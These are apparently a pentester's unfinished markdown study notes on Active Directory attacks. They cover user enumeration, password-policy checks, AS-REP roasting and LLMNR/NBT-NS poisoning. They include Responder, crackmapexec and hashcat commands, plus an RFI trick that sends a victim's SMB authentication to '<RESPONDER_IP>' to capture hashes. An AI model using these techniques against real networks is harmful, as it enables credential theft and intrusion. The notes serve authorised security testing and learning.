# Active Directory/Domain Controller Pentesting

In a realistic attack chain, you may gain foothold on one endpoint as a low privilege user, then scan the network to identify vulnerable hosts, exploit it and then escalate privileges to `root`.
But, then you realise that this host does not have anything important! 

  > What good does a root RCE do if it's on an isolated temp system with no data?

It's time to shift our thought process from Hosts, Services, CVEs, exploits and RCE to Identities, Trusts, Permissions and Tokens.
It's time to shift our thought process from VAPT to Red-teaming.

We need

Usernames > Passwords > Group Memberships


## Step 0: Gaining Initial Foothold

## Step 1: Getting Usernames

There are several ways that we can gather a target list of valid users:

1. By leveraging an `SMB NULL session` to retrieve a complete list of domain users from the domain controller.
2. Utilizing an `LDAP anonymous bind` to query LDAP anonymously and pull down the domain user list.
3. Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users.
4. Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as `LLMNR/NBT-NS response poisoning` using `Responder` or even a successful password spray using a smaller wordlist.


## Step 2: Getting Password Policy 

Why? Because we do NOT want to be the pentester that locks out every account in the organization!


```
$ crackmapexec smb <ADDC-IP> -u <USERNAME> -p <PASSWORD> --pass-pol
```

```
PS C:\> import-module .\PowerView.ps1
PS C:\> Get-DomainPolicy
```

## Step 3: Getting Username + Password = Account 




## AS-REP Roasting
Some user accounts in the AD have this option of *'Do not require Kerberos preauthentication'* (`DONT_REQ_PREAUTH`) enabled. This means that, these users can make an AS-REQ (Authentication Service-Request)
without including their password hash as preauthentication. 

1. Identify such users which are AS-REP roastable.
2. Send an AS-REP request impersonating them (using `Rubeus`), without including preauth, to the DC.
3. The DC responds back with a `Session Key` and a `TGT` (Ticket Granting Ticket).
4. Since the KDC encrypts part of the AS-REP using the user's Kerberos long-term secret key derived from the password, we can crack these to get the user's plan text password. 




## LLMNR/NBT-NS Poisoning
Suppose we are in the nework, but we don't have any credentials to give to the domain to gain its trust. Since, there are other domain-joined hosts within the network, we can do a MitM attack.

When Windows systems try resolve hostnames within a network, they use:

 1. **DNS** (Domain Name Service) for name resolution. If DNS fails to resolve the hostname, then it falls to:
 2. **LLMNR** (Link-Local Multicast Name Resolution - `udp/5355`) for name resolution. If LLMNR fails to resolve the hostname, then it falls to:
 3. **NBT-NS** (Legacy NetBIOS Name Service - `udp/137`) for name resolution.

Let's look at an example to understand this better:

1. Attacker sets-up the machine and listens to the network traffic using [Responder](https://github.com/lgandx/Responder) patiently foreverr ... <br> ```sudo responder -I <interface>```
2. `COPR-WIN-VCTM02` attempts to connect to the print server at `\\print01.tech.local`, but ***accidentally types in `\\printer01.tech.local`***. `COPR-WIN-VCTM02` sends DNS query request for `\\printer01.tech.local`.
3. Since there is no device named `\\printer01.tech.local`, the DNS server responds stating that this host is unknown.
4. Since DNS failed to resolve the hostname, `COPR-WIN-VCTM02` falls back to LLMNR.
5. `COPR-WIN-VCTM02` then broadcasts out to the entire local network asking if anyone knows the location of `\\printer01.tech.local`.
6. The attacker machine sees this and responds to `COPR-WIN-VCTM02` stating that it is the `\\printer01.tech.local` that the host is looking for.
7. ***The `COPR-WIN-VCTM02` host believes this reply***. `COPR-WIN-VCTM02` then sends an authentication request to the attacker with a username & NTLMv2 password hash to gain access.
8. This hash can then be cracked offline or used in an SMB Relay attack given that the right conditions exist.

```bash
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cool Trick**:
Suppose you have a host which hosts a web application, and say you found a RFI vulnerability on it. You can use a custom URL query like `http://target.com/index.php?page=//<RESPONDER_IP>/somefile` to trigger an SMB authentication request to your
`Responder` instance. This eliminates the waiting period for Step #2 and takes out the reliance on the victim making a mistake. 

If you cannot run Responder for whatever reasons, you can also try [Inveigh](https://github.com/Kevin-Robertson/Inveigh).

**Caveats**
1. This obviously does not work if the network only relies on DNS for name resolution.
2. Some networks often disable LLMNR and NBT-NS protocols for name-resolution.



## Kerberos Pre-Auth Bruteforcing






#### References
1. https://orange-cyberdefense.github.io/ocd-mindmaps/  [GREAT !!!]
2. https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet 
